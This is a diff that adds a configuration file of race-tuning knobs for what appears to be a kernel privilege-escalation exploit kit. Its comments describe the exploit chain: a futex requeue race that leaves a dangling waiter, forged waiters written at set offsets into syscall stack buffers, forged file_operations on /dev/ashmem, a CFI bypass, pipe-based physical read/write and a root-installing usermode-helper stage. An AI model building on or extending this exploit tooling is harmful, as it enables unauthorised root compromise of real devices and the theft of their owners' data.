@@ -1,0 +1,113 @@
+# The tcp-zc, sigreturn, clone3, process-vm, bpf and mcast vehicles' shared
+# race-shape tunables (fops_tcp.c/fops_sigreturn.c/fops_clone3.c/
+# fops_process_vm.c/fops_bpf.c/fops_mcast.c): all six drive the same shape of race (a
+# vehicle whose copy returns immediately, raced against the shared
+# consumer_thread -- see cves/lib/rtmutex/reclaim_race.h's header comment),
+# so they read the same knob names rather than each carrying its own
+# duplicate, differently-prefixed set -- none of clone3/sigreturn/
+# process-vm/bpf/mcast gets its own MAIN_<VEHICLE>_* family. None of the six
+# depends on a stage's own
+# [pselect_map] the way pselect's parameterised route does
+# (ghostlock-vehicle-knobs-pselect.toml), so every interface that compiles
+# these six .c files pulls this fragment in -- currently all three
+# interfaces.
+#
+# RECLAIM_VEHICLE itself, the one tunable and the one runner-supplied set
+# every interface shares regardless of how many vehicles it implements, is
+# ghostlock-vehicle-select.toml, not this file: a stage pulls that one in
+# first, then this one (and ghostlock-vehicle-knobs-pselect.toml where it
+# applies) via `tunables_from` (a list) -- these knobs presuppose the
+# selector already exists.
+[tunables]
+CFI_MODE = { type = "enum", values = ["verify", "fast"], default = "fast", help = "fast restores global fops then proceeds to install-root; verify runs the diagnostic probes" }
+PHYSRW_VERIFY = { type = "bool", default = false, help = "repeat the 64-bit pipe read/write/readback proof after locating a live pipe buffer; disabled by default after a device has passed it once" }
+CONFIGFS_READ_TRACE = { type = "bool", default = false, help = "after fops restoration, log up to 256 nameblob preads with target, page, offset, caller, result and monotonic time; disabled by default" }
+ROOT_UMH_FORGE_ENV = { type = "bool", default = true, help = "forge CVE43499_EXPLOIT_LOG_ENV into the UMH helper's envp[0]; set false to publish with an empty environment (matches the reference implementation) while isolating why the helper's own code never runs" }
+MAIN_ROUTE_ATTEMPTS = { type = "int", min = 1, max = 1000000 }
+MAIN_ROUTE_DELAY_USEC = { type = "int", min = 0, max = 1000000 }
+MAIN_ROUTE_ARM_SEQ = { type = "int", min = 1, max = 1000000 }
+MAIN_PAGE_ATTEMPTS = { type = "int", min = 1, max = 1000 }
+MAIN_RESPRAY_TIMEOUT_SEC = { type = "int", min = 1, max = 300, default = 30, help = "SIGALRM bound on a single page respray's crosscache leak (vehicle_race_respray, fops_vehicle_race.h); unwinds a stalled attempt instead of running out the shot timeout" }
+MAIN_CFI_ATTEMPTS_PER_PAGE = { type = "int", min = 1, max = 1000 }
+MAIN_POST_CALL_HOLD = { type = "int", min = 0, max = 1000000 }
+# sockopt punch/compaction/pre-seed and the shared consumer hammer count.
+CONSUMER_MAX_CALLS = { type = "int", min = 1, max = 1000000 }
+# Microseconds between the consumer's per-arm sched_setattr calls. 0 (default)
+# is the tight burst the proven panther path uses; a copy-stall vehicle held on
+# the stack for milliseconds (a52s sockopt at a long MAIN_POST_CALL_HOLD) wants
+# its CONSUMER_MAX_CALLS fires SPREAD across that window so one lands in the
+# sub-window the walk actually engages in.
+CONSUMER_CALL_GAP_USEC = { type = "int", min = 0, max = 1000000 }
+# How many times try_cfi_stage() re-opens /dev/ashmem to capture the forged fops
+# before giving up. The walk's write is asynchronous,
+# so the first open often latches the real fops even though the slot does get
+# forged a moment later; re-opening closes that gap and a build that captures on
+# the first try is unaffected (the loop exits immediately).
+CFI_VERIFY_REOPEN = { type = "int", min = 1, max = 100000 }
+# Fire the consumer's sched_setattr only when the waiter thread is
+# stalled inside the vehicle (state in CONSUMER_GATE_STATES, env, default "D"),
+# waiting up to CONSUMER_GATE_WAIT_USEC; else skip the arm. W's observed state
+# is logged at every fire regardless.
+CONSUMER_GATE_MODE = { type = "enum", values = ["off", "wchan", "incall", "both"], default = "incall" }
+# `incall` waits for the placing thread's in-call handshake; `wchan` samples its
+# state through /proc. `both` requires both gates; `off` leaves timing ungated.
+# The in-call handshake avoids sampling that may land tens of microseconds late.
+CONSUMER_GATE_WAIT_USEC = { type = "int", min = 0, max = 1000000 }
+# Microseconds the copy-stall puncher keeps the tail torn down before refilling
+# it: the duty cycle, i.e. how long arm_window() waits for the next rising edge.
+# It does not widen a stall -- the punch wakes every faulting task before it
+# returns, so the stall is over by the time this sleep starts (see
+# cves/lib/rtmutex/copy_stall.h). 0 refills immediately.
+STALL_PUNCH_HOLD_USEC = { type = "int", min = 0, max = 1000000 }
+# Instrumentation threshold: a sockopt fire whose copy took >= this many us is
+# counted "stalled" in the main-sockopt-stall-stats line. Tuning guide, not a
+# behaviour knob.
+SOCKOPT_STALL_MIN_US = { type = "int", min = 0, max = 1000000 }
+# Armed fires per main-sockopt-stall-stats line. The route ends at its first
+# consumed attempt, so a period above that leaves a run with no reading; the
+# line also prints once unconditionally when the route returns.
+SOCKOPT_STALL_REPORT = { type = "int", min = 1, max = 1000000 }
+# Stall geometry. STRADDLE_TAIL:
+# bytes of the 254-byte sockopt buffer in the punched tail page (overlay ends
+# ~152, so up to 96 is safe). STALL_MAP_LEN: copy-stall region size in bytes --
+# the stalled copy is woken as the punch call's last act, so this size IS the
+# window's width (0 = lib default 512K).
+# Punch only when a window is asked for, instead of cycling continuously. The
+# window is the same width either way; free-running costs a fill of the whole
+# region every period whether or not anyone is about to fire.
+SOCKOPT_STALL_ONESHOT = { type = "bool" }
+SOCKOPT_STRADDLE_TAIL = { type = "int", min = 8, max = 96 }
+STALL_MAP_LEN = { type = "int", min = 0, max = 67108864 }
+# Overlay-hold strategy (fops_sockopt.c): "stall" (default, copy-stall punch
+# race) or "idle" (one plain copy, then W spins in userspace so the overlay
+# persists in its idle kernel stack for the walk -- deterministic where the
+# kernel does not randomize the per-syscall stack offset).
+SOCKOPT_OVERLAY_STRATEGY = { type = "enum", values = ["stall", "idle"] }
+# IDLE strategy: per-placement park in milliseconds (wall-clock deadline). Short
+# enough that one run does many placements (many samples), longer than the
+# monitor sample cadence so each placement is observed.
+IDLE_PARK_MS = { type = "int", min = 1, max = 60000 }
+SOCKOPT_PUNCH = { type = "bool" }
+SOCKOPT_PRESEED = { type = "bool" }
+GHOSTLOCK_COMPACT_MB = { type = "int", min = 0, max = 512 }
+MAIN_LOG_MODE = { type = "enum", values = ["off", "each", "trigger", "both"], default = "off" }
+# Log the trigger's own two return values: the requeue that has to hit the
+# deadlock, and the waiting thread's return from it. The dangling waiter exists
+# only when the requeue's proxy-lock rolls back on the requeuer, so a requeue
+# that simply succeeded leaves nothing to walk -- and that failure is otherwise
+# silent, since every later stage behaves exactly as it does on a lost race.
+# tcp-zc-specific: no sigreturn equivalent (its page geometry is "full",
+# not "narrow" -- see page_geometry_narrow()'s callers).
+MAIN_TCP_RETRY_PIPE_GEOM = { type = "bool" }
+# sigreturn-specific: the one per-target fact, not a race-shape knob.
+SIGRETURN_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "SIGRETURN_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=sigreturn", help = "byte offset into struct user_fpsimd_state.vregs the forged waiter is written at" }
+# clone3-specific: the one per-target fact, not a race-shape knob.
+CLONE3_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "CLONE3_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=clone3", help = "byte delta into struct clone_args's copy destination the waiter placement is checked against; gate-check only (clone3_gate_check(), fops_clone3.c) -- the writes land at parent_tid/exit_signal regardless" }
+# process-vm-specific: the one per-target fact, not a race-shape knob.
+PROCESS_VM_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "PROCESS_VM_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=process-vm", help = "byte offset into process_vm_rw()'s own remote-iovec fast array the forged waiter is written at" }
+# bpf-specific: the one per-target fact, not a race-shape knob.
+BPF_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "BPF_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=bpf", help = "byte offset into __sys_bpf()'s/__do_sys_bpf()'s own union bpf_attr buffer the forged waiter's task/lock pair is written at" }
+# mcast-specific: the one per-target fact, not a race-shape knob.
+MCAST_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "MCAST_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=mcast", help = "byte offset into do_ip_setsockopt()'s own struct group_source_req the full forged waiter is written at" }
+# sockopt-specific: the one per-target fact, not a race-shape knob.
+SOCKOPT_WAITER_OFF = { type = "int", min = -1000000, max = 1000000, default_fact = "SOCKOPT_WAITER_OFF", applies_when = "RECLAIM_VEHICLE=sockopt", help = "byte offset into sock_setsockopt()'s own SOL_SOCKET-option stack buffer the forged waiter's task/lock pair is written at" }
